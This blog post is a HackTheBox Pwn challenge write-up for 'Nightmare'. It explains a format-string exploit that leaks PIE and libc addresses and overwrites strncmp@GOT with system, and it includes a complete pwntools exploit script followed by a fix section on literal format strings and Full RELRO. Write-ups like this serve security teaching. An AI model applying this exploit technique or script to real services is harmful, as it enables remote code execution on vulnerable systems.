---
layout: post
title: "Nightmare"
date: 2027-08-12 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, format-string, got-overwrite, no-relro, pie, CWE-134]
---

## Overview

**Nightmare** is an Easy HackTheBox **Pwn** challenge. The binary has **No RELRO** (writable GOT), PIE, a stack canary, and NX. Two menu options each hand user input directly to a format function — one for leaking, one for writing — enabling a classic [use of externally-controlled format string](https://cwe.mitre.org/data/definitions/134.html) exploit that overwrites a GOT entry and achieves one-shot RCE.

## The technique

The binary exposes two format-string primitives:

- **Option 2 (escape\_code):** `fgets(buf, 6, stdin)` then `printf(buf)` — output goes to stdout (the socket), so it is the **read/leak** primitive. Up to 5 chars of format specifier.
- **Option 1 (scream):** `fgets(buf, 256, stdin)` then `fprintf(stderr, buf)` — output goes to stderr (not the socket), so it is the **write** primitive. pwntools can still spray `%N$hhn` writes through it.

The exploit is three phases:

1. **Leak PIE + libc** via escape\_code's `printf(buf)`. Position 1 (`%1$p`) leaks `&"lulzk"` = PIE base + 0x2079. Position 13 (`%13$p`) leaks `__libc_start_main_ret`; its lower 12 bits (`0x0b3`) fingerprint glibc 2.31-0ubuntu9.3\_amd64.

2. **Overwrite `strncmp@GOT` → `system`** via scream's `fprintf(stderr, buf)`. The key choice is `strncmp@GOT`, not `printf@GOT` — `printf@plt` is called for BOTH the menu prompt and the exploit trigger, so overwriting it kills the socket's output and blocks `recvuntil`. `strncmp@plt` is called only inside `strncmp_wrapper`, which is only reached from escape\_code. Overwriting it leaves all prompts intact.

3. **Trigger RCE** by sending `"cat *"` (5 chars, exactly fitting the `fgets(buf, 6)` limit) as the escape code. The call becomes `strncmp_wrapper("cat *\n\0") → strncmp@plt → GOT = system → system("cat *")`, which cats all files in the CWD (`/home/ctf`, containing `flag.txt`).

## Solution

```bash
python3 solve.py
```

**`solve.py`:**

```python
#!/usr/bin/env python3
from pwn import *
import re

HOST, PORT = '<rhost>', <rport>
context.arch = 'amd64'

LULZK_OFF      = 0x2079    # offset of "lulzk" string from PIE base
RET_ESC_OFF    = 0x14d5    # escape_code saved return offset from PIE base
STRNCMP_GOT    = 0x3550    # strncmp@GOT offset from PIE base (readelf -r)
LIBC_SMRET_OFF = 0x270b3   # __libc_start_main_ret in glibc 2.31
SYSTEM_OFF     = 0x55410   # system() in glibc 2.31

def probe_single(p, pos):
    p.sendline(b'2'); p.recvuntil(b'>>')
    p.sendline(f'%{pos}$p'.encode())
    data = p.recvuntil(b'> ')
    val = data.split(b'\n')[0].strip()
    return 0 if val == b'(nil)' else int(val, 16)

def probe_double(p, pos):
    # 5-char probe leaves '\n' in stdin → extra main loop iteration
    # Recovery: second recvuntil + send 'q' + third recvuntil
    p.sendline(b'2'); p.recvuntil(b'>>')
    p.sendline(f'%{pos}$p'.encode())
    data = p.recvuntil(b'> ')
    val  = data.split(b'\n')[0].strip()
    p.recvuntil(b'> ')
    p.send(b'q')
    p.recvuntil(b'> ')
    return 0 if val == b'(nil)' else int(val, 16)

p = remote(HOST, PORT, timeout=20)
p.recvuntil(b'> ')

# Phase 1: leak PIE + libc
pie_base    = probe_single(p, 1) - LULZK_OFF
ret_check   = probe_single(p, 9)
assert (ret_check - RET_ESC_OFF) == pie_base

libc_leak   = probe_double(p, 13)
assert (libc_leak & 0xfff) == 0x0b3
libc_base   = libc_leak - LIBC_SMRET_OFF
system      = libc_base + SYSTEM_OFF
strncmp_got = pie_base + STRNCMP_GOT

# Phase 2: overwrite strncmp@GOT → system via scream's fprintf(stderr, buf)
# write_size='byte' → only %hhn writes; avoids %lln which some glibc builds reject
p.sendline(b'1'); p.recvuntil(b'>>')
payload = fmtstr_payload(5, {strncmp_got: system}, write_size='byte')
assert len(payload) <= 255
p.sendline(payload)
p.recvuntil(b'> ', timeout=5)   # printf("> ") still works — prompts intact

# Phase 3: RCE — "cat *" in CWD /home/ctf → flag.txt
p.sendline(b'2'); p.recvuntil(b'>>')
p.sendline(b'cat *')            # system("cat *") → reads flag.txt

out = b''
try:
    while True:
        chunk = p.recv(timeout=3)
        if not chunk: break
        out += chunk
except: pass

flag = re.findall(rb'HTB\{[^}]+\}', out)[0].decode()
print(flag)   # HTB{...}
```

## Why it worked

**No RELRO** means the Global Offset Table is writable at runtime. Any [format string](https://cwe.mitre.org/data/definitions/134.html) write primitive — even `fprintf(stderr, user_buf)` — can point an arbitrary GOT entry at `system`. With PIE and libc randomised, the exploit leaks both bases first via the second format string channel (`printf(buf)` on stdout), then uses the write channel to patch the GOT entry for `strncmp`. The command-length constraint (`fgets` limit of 5 chars) is addressed by using `system("cat *")` in the CWD instead of spawning an interactive shell.

The reason `strncmp@GOT` is chosen over the more obvious `printf@GOT`: `printf@plt` is called for the menu prompt (`"> "`) as well as for the leak trigger. After overwriting `printf@GOT = system`, every prompt call becomes `system("> ")` — no output to the socket, `recvuntil` blocks until the alarm fires. `strncmp@plt` is only called from the comparison wrapper, so overwriting it has no side effects on I/O.

## Fix / defense

```c
// vulnerable
fprintf(stderr, user_buf);
printf(user_buf);

// fixed — always pass a literal format string
fprintf(stderr, "%s", user_buf);
printf("%s", user_buf);
```

Compile with **Full RELRO** (`-Wl,-z,relro,-z,now`) to make the GOT read-only after dynamic linking. This renders any `%n`-based GOT overwrite inert, even if a [CWE-134](https://cwe.mitre.org/data/definitions/134.html) format-string bug survives in the code.
